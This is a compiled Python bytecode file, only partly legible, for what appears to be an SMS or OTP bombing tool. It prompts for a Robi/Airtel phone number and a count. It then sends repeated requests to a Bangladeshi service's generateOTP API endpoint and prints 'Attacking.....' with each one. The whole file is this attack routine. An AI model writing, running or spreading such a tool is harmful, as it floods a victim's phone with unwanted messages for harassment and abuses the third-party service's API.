a
    2`�`{  �                   @   sj   d dl Z ed�Zed�Ze�d�ZeD ]>Zeee��D ],Z	e j
dddideid	� eee�d
 � q6q&dS )�    Nz"[>] Enter The RoBi/Airtel Number: z[>] Choice Your Pin Amount: � z<https://fundesh.com.bd:443/api/auth/generateOTP?service_key=zContent-Typezapplication/jsonZmsisdn)Zheaders�dataz  Attacking.....)Zrequests�inputZnumberZamount�splitZssss�x�range�int�i�get�print�str� r   r   �z.py�<module>   s   
